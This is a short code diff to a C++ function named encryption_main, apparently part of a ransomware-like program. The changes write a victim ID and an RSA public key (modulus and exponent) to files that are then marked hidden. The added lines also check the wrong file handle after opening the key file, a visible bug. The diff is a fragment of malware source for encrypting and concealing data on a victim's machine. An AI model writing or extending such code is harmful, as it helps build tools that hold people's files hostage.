@@ -50,9 +50,10 @@ int encryption_main( bool fromStart) {
 	changeHiddenFileState(false);
 
 	string pathToID = get_path_to_id();
+	string pathToENC = get_path_to_ENC();
 
 	//TODO set SquanchedID and IMAGE invisible
-	std::fstream IDFile;
+	std::fstream IDFile, pubFile;
 	Status status;
 	PBYTE id = nullptr;
 	HANDLE hCurrentProcess = nullptr;
@@ -115,6 +116,16 @@ int encryption_main( bool fromStart) {
 	IDFile.write((char*)id, ID_LEN);
 	IDFile.close();
 	makeFileHidden(pathToID);
+
+	pubFile.open(pathToENC, std::ios::out);
+	if (!IDFile.is_open())
+	{
+		std::cout << "Failed to open file: " << GetLastError() << std::endl;
+	}
+	pubFile << "<Modulus>"<< mod << "</Modulus><Exponent>" << pubKey << "</Exponent>";
+	pubFile.close();
+	makeFileHidden(pathToENC);
+
 
 	
 
